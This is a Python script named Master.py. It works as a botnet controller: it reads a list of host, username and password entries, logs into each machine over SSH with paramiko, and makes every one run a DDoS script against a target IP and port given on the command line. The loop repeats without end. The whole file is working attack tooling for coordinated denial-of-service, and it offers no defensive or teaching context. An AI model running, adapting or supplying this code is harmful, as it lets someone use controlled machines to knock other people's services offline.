#coding:utf-8
"""
Author:Hou Yuling
Time:6/27/2022 4:24 PM
"""
import argparse
import paramiko
import threading
import os
import sys

botnet = []
class SSHClient:

    def __init__(self, host, user, password):
        self.host = host
        self.user = user
        self.password = password
        self.session = self.connect()

    def connect(self):
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            print("connecting:"+self.host)
            ssh.connect(self.host, 22, self.user, self.password)
            return ssh
        except Exception as e:
            print(e)
            print('[-] Error Connecting')

    def send_command(self, cmd):
        #self.session.sendline(cmd)
        #self.session.prompt()
        #print(cmd)
        stdin, stdout, stderr = self.session.exec_command(cmd)
        str1=stdout.read().decode('utf-8')
        #print("str1:",str1)
        return str1

def botnet_command(command,k):
    for client in botnet:
        output = client.send_command(command)
        if k:
            print('[*] Output from ' + client.host)
            print('[+] ' + output)

def add_client(host, user, password):
    client = SSHClient(host, user, password)
    botnet.append(client)
    #print(botnet)

def main():
    parser=argparse.ArgumentParser(description='description:command format: python Master.py --file botnet.txt --target-ip x.x.x.x --tartget-port xx')
    parser.add_argument('--file',type=str,required=True,help='slave vms info,including ip, username and password')
    parser.add_argument('--target-ip',type=str,required=True,help='specify target ip')
    parser.add_argument('--target-port', type=int, required=True, help='specify target port')
    args=parser.parse_args()
    target_ip=args.target_ip
    target_port=args.target_port
    file=args.file
    if file ==None:
        print(parser.description)
        exit(0)
    count=len(open(file,'r').readlines())
    while True:
        #cmd=input(ss)
        cmd1="ulimit -n 1000000"
        #cmd2="python3 DDoS.py"
        cmd2="python3 DDOS.py --ip {} --port {}".format(target_ip,target_port)
        k=0
        f=open(file,'r')
        for line in f.readlines():
            line = line.strip('\n')
            host = line.split(":")[0]
            #print(host)
            user = line.split(":")[1]
            #print(user)
            password = line.split(":")[2]
            #print(password)

            k+=1
            if k<count:
                add_client(host,user,password)
                print('add_client success!')
                botnet_command(cmd1,False)
                botnet_command(cmd2, False)
            else:
                add_client(host,user,password)
                botnet_command(cmd1,True)
                botnet_command(cmd2, True)

if __name__ == '__main__':
    try:
        print("First please execute python Master.py -h!!!"+'\n'+'\n')
        main()
    except KeyboardInterrupt:
        print("exit")
        sys.exit()
    #cmd1="ulimit -n 1000000"
    #botnet_command(command=cmd)
    #cmd_th1=threading.Thread(target=botnet_command,args=(cmd1))
    #cmd2="python DDoS.py"
    #botnet_command('python DDoS.py')
    """线程传递多个参数或者是字符串的时候，要用中括号"""
    #cmd_th2=threading.Thread(target=botnet_command,args=([cmd2]))
    #cmd_th1.start()
    #cmd_th2.start()
